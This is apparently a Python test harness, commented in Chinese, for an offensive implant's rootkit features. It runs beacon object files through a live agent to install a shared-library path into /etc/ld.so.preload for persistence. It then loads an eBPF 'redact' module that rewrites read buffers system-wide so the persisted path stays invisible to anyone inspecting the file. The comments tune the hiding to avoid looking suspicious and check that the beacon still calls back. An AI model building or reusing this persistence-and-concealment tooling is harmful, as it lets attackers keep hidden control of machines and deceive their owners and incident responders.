#!/usr/bin/env python3
"""P9 / ISS-076 + ISS-083 验收 v3：`/etc/ld.so.preload` 的内容层。

被测对象：`ld_preload_install.c` 写进 `/etc/ld.so.preload` 的那一行，
以及 `redact.c` 读它时的选择性抹平。

── ISS-076（幂等 + 豁免通道）──────────────────────────────────────────────
  `redact.c` 把 `/etc/ld.so.preload` 在读时**选择性抹平**（`ax_tail_preload()`
  判据）。走工具通道读回来的是**假内容**，后果两条都是自伤：
    ① already-present 检查永远不命中 ⇒ 每次重复追加；
    ② `AxWriteFile(fd, old, old_len)` 把空格当"已有条目"写回 ⇒ 亲手毁掉产物。
  修法 = `AxReadFileReal`（`AxAccess` 探一次 + 带 `O_CLOEXEC` 开 ⇒ 进 redact_fds
  豁免表，读分支不再扫这个 fd）。

── ISS-083（内容层缺口）──────────────────────────────────────────────────
  持久化产物是**我们 .so 的路径**，而它原样躺在盘上可读。三处叠加：
    ① `ax_pl_register()` 只登记基名 `ld.so.preload`（服务**枚举层**），
       而 `ax_scan` 比对的是文件里**字面出现的文本** = .so 路径 ⇒ 词 0 个；
    ② `redact.c` 的 read 分支原来 `n < AX_CHUNK(32)` 就**整个不扫**，
       而"只有我们一行短路径"的 19 字节文件**正落在门槛外**；
    ③ `ax_scan` 的 `lim` 在短文件时是负数，尾块闸门失效。
  ①②③ 均已修。

★ v3 为什么要按这个顺序排（这是本脚本最要紧的部分）：

  v2 把"登记"当成**外部输入**手工喂进 `<names>`，于是 B/C 两相只差一个词，
  看起来干净 —— 但修好 BOF 之后它必然失效：真实路径是 **BOF 自己登记**
  （`ax_pl_register(sobuf, so_len)`），不是操作者手填。台面若还按老样子喂
  `<names>`，测的就不是产品，是台面自己搭的脚手架。

  更要紧的是 v2 **没有判别力**：B2/B3 断言"走工具通道读到的和真身一致"，
  可当时文件**根本没被抹**（B1 已证明），"都没被抹"当然"一致"。
  ⇒ 断言必须建立在"抹平确实会发生"的前提上。v3 用 **B1 阴性对照**把它钉死：
  同一份文件、同一次 redact 加载，**只差 names 里有没有那个路径词**——
    · B1（names 无路径词）⇒ **读得到**（阴性）
    · C1（names 有路径词）⇒ **读不到**（阳性）
  两条同时成立，才排除了"路径消失是别的原因（比如读失败/文件没了）"。

相序：
  A 相  无 redact                      —— 基线 + 幂等
  B 相  redact, names=基名             —— B1 **阴性对照** / B2-B3 ISS-076 核心
  C 相  redact, names=基名+路径         —— C1 **成因②阳性**（短文件也扫）
  D 相  redact, names=基名, 再调 BOF    —— D1-D2 **成因①端到端**（BOF 自登记）

★ 判别力的锚点是**文件长度**：抹平是 `bpf_probe_write_user` 改**用户读缓冲**，
  不碰磁盘 ⇒ `os.path.getsize` 是**文件系统的账**，redact 伪造不了它。
  走工具通道读回等长空格后若拿它回写，长度会 **L → 2L 翻倍** —— 比回执字符串硬。
"""
import os
import subprocess
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import e2e
import gap10_rootkit_verify as g10            # pack_load / pack_unload / BPF_OUT
import p03_hide_link_verify as p03            # run_bof / blob：精确参数字节
import p15_redact_verify as p15               # read_tracked / getuid_ok / kill

PIN = "axp25"
LISTENER = "TestHTTP"
PRELOAD = "/etc/ld.so.preload"
BASENAME = b"ld.so.preload\x00"
# ★ 短路径 .so（**17 字符 ≤ AX_WORD=32**）：`ax_scan` 一次只掩/写回 32 字节，
#   更长的路径**机制上抹不干净**，而"半抹"比"不抹"更可疑 ⇒ 正解是短路径规避，
#   不是给长路径打补丁。`ld_preload_install.c` 里对 >32 的路径**故意不登记**，
#   并在回执里说明 —— 那条分支不在这里判（由代码常量唯一确定，再证一遍是重复劳动）。
SO = "/usr/lib/axp25s.so"
R = []


def rec(item, ok, note=""):
    R.append(bool(ok))
    print("  [%s] %s   %s" % ("PASS" if ok else "FAIL", item, note), flush=True)


def body(path=PRELOAD):
    try:
        with open(path, "rb") as f:
            return f.read()
    except OSError:
        return None


def sz(path=PRELOAD):
    """★ 文件长度：文件系统的账，`bpf_probe_write_user` 伪造不了 ⇒ 判别力的锚点。"""
    try:
        return os.path.getsize(path)
    except OSError:
        return -1


def install(a0, so, timeout=60):
    """跑一次 ld_preload_install，返回回执文本。"""
    return p03.run_bof(a0, "ld_preload_install", p03.blob(so.encode()),
                       timeout=timeout) or ""


def load_redact(a0, names, pin):
    txt = p03.run_bof(a0, "ebpf_load", g10.pack_load(
        "%s/redact.insns.bin" % g10.BPF_OUT, "%s/redact.mapreloc.txt" % g10.BPF_OUT,
        5, 1, "raw_syscalls/sys_exit", names, "", b"", pin), timeout=90) or ""
    return txt, ("failed" not in txt) and ("attached" in txt or "cpus=" in txt)


def unload(a0, pin):
    try:
        p03.run_bof(a0, "ebpf_unload", g10.pack_unload(pin), timeout=60)
    except Exception as e:
        print("[warn] unload %s: %s" % (pin, e), flush=True)
    time.sleep(0.8)


def mk_so(path):
    subprocess.run(["gcc", "-shared", "-fPIC", "-nostdlib", "-o", path,
                    "-x", "c", "/dev/null"], check=True)
    return (body(path) or b"")[:4] == b"\x7fELF"


def main():
    pid0, a0, loaded = 0, None, None          # loaded = 当前加载着的 pin
    existed = os.path.exists(PRELOAD)
    orig = body() if existed else None
    print("[env] 原始 %s = %s" % (PRELOAD, "不存在" if not existed else "%d 字节" % len(orig)),
          flush=True)
    try:
        rec("T-prep 短路径空 .so 是合法 ELF（且 ≤ AX_WORD=32）",
            mk_so(SO) and len(SO) <= 32, "%s (%d 字符)" % (SO, len(SO)))

        if existed:
            os.remove(PRELOAD)               # 从"无文件"起跑

        bin0 = e2e.gen_agent(LISTENER, "p25a0")
        pid0 = e2e.launch(bin0)
        a0 = e2e.wait_registered(LISTENER, pid0, timeout=90)
        print("[env] A0 aid=%s pid=%d" % (a0, pid0), flush=True)

        # ══ A 相：无 redact（幂等逻辑本身）═══════════════════════════════════
        t1 = install(a0, SO)
        s1 = sz()
        rec("A1 第一次 install：文件被创建且含我们的路径",
            s1 > 0 and SO.encode() in (body() or b"") and "[+]" in t1,
            "sz=%d" % s1)
        t2 = install(a0, SO)
        s2 = sz()
        rec("A2 幂等（无 redact）：第二次回 already present 且字节数不变",
            "already present" in t2 and s2 == s1, "sz %d→%d" % (s1, s2))
        if s1 <= 0:
            print("[abort] A 相没造出文件，后面的对照没有基准", flush=True)
            return 1

        # ══ B 相：redact, names=**仅基名** ⇒ 路径词不在表里 ══════════════════
        txt, ok = load_redact(a0, BASENAME, PIN)
        rec("B0 redact 已加载 (names=[基名])", ok,
            (txt.strip().splitlines() or [""])[-1][:60])
        if not ok:
            print("[abort] redact 未加载，B 相无从谈起", flush=True)
            return 1
        loaded = PIN
        time.sleep(1)

        _, trb = p15.read_tracked(PRELOAD)
        rec("B1 ★★阴性对照：names 里**没有**路径词 ⇒ 工具通道读得到它",
            SO.encode() in trb,
            "读回 %d 字节，含路径=%s" % (len(trb), SO.encode() in trb))
        # ★ 这条红了才说明本台面**有**判别力：否则下面 C1/D2 的"读不到"
        #   可能只是因为别的原因（文件被删 / 读失败 / redact 把整个文件抹了）。

        t3 = install(a0, SO)
        s3 = sz()
        rec("B2 ★★核心(ISS-076)：redact 生效时第二次 install 仍回 already present",
            "already present" in t3 and "[+]" not in t3, "sz %d→%d" % (s2, s3))
        rec("B3 ★★文件未被污染：字节数不变（走工具通道回写的话必然翻倍）",
            s3 == s1, "sz %d→%d（翻倍的话是 %d）" % (s1, s3, 2 * s1))

        # ══ C 相：redact, names=基名+路径 ⇒ 与 B 相**只差一个词** ════════════
        unload(a0, PIN)
        txt, ok = load_redact(a0, BASENAME + SO.encode() + b"\x00", PIN)
        rec("C0 redact 已重载 (names=[基名, 路径])", ok,
            (txt.strip().splitlines() or [""])[-1][:60])
        if not ok:
            return 1
        loaded = PIN
        time.sleep(1)

        _, trc = p15.read_tracked(PRELOAD)
        rec("C1 ★★成因②阳性：19 字节的短文件**也**被扫到了（修前必红）",
            SO.encode() not in trc,
            "读回 %d 字节，含路径=%s" % (len(trc), SO.encode() in trc))
        rec("C2 抹平是**等长盖空格**，不是删行：字节数不变",
            sz() == s1, "sz %d→%d" % (s1, sz()))

        # ══ D 相：redact, names=**仅基名** ⇒ 起点确定，登记只能来自 BOF ══════
        unload(a0, PIN)
        txt, ok = load_redact(a0, BASENAME, PIN)
        rec("D0 redact 已重载 (names=[基名]，路径词**不在**表里)", ok,
            (txt.strip().splitlines() or [""])[-1][:60])
        if not ok:
            return 1
        loaded = PIN
        time.sleep(1)

        t4 = install(a0, SO)
        rec("D1 ★★成因①端到端：BOF 自己把 .so 路径登记进了内容层",
            "hide(内容层)" in t4 and "ok" in t4,
            (t4.strip().splitlines() or [""])[-1][:70])
        _, trd = p15.read_tracked(PRELOAD)
        rec("D2 ★★★ ISS-083 收官：登记之后，`cat /etc/ld.so.preload` 读不到产物",
            SO.encode() not in trd,
            "读回 %d 字节，含路径=%s" % (len(trd), SO.encode() in trd))
        rec("D3 幂等仍在（这条路没被登记动作破坏）",
            "already present" in t4 and sz() == s1, "sz=%d" % sz())

        rec("D4 回归：beacon 仍通（getuid 回执）", p15.getuid_ok(a0))
        return 0 if all(R) else 1
    finally:
        # 顺序要紧：先卸模块（它在改全机 read），再恢复文件、删 .so、杀进程。
        if loaded:
            unload(a0, loaded)
        try:
            if orig is None:
                os.remove(PRELOAD)
            else:
                with open(PRELOAD, "wb") as f:
                    f.write(orig)
        except OSError as e:
            print("[warn] 恢复 %s: %s" % (PRELOAD, e), flush=True)
        try:
            os.remove(SO)
        except OSError:
            pass
        now = os.path.exists(PRELOAD)
        same = (not now) if orig is None else (body() == orig)
        print("[env] 现场已复原：%s 存在=%s 内容一致=%s / .so 已删=%s"
              % (PRELOAD, now, same, not os.path.exists(SO)), flush=True)
        p15.kill(pid0)
        print("\n[warn] 台面 = %d/%d" % (sum(R), len(R)), flush=True)
        print("RESULT: %s" % ("PASS" if R and all(R) else "FAIL"), flush=True)


if __name__ == "__main__":
    sys.exit(main())
